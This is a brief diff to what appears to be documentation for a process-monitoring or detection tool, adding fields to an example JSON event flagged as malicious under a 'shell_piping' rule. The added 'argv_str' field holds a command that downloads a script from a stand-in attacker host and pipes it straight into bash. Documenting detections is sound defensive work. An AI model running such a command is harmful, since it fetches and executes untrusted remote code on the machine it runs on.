@@ -232,6 +232,8 @@ Events are sent as JSON when:
   "ppid": 5600,
   "uid": 1000,
   "gid": 1000,
+  "argv_str": "curl http://attacker.com | bash",
+  "comm": "bash",
   "risk_score": 85.2,
   "classification": "malicious",
   "matched_rules": ["shell_piping"],
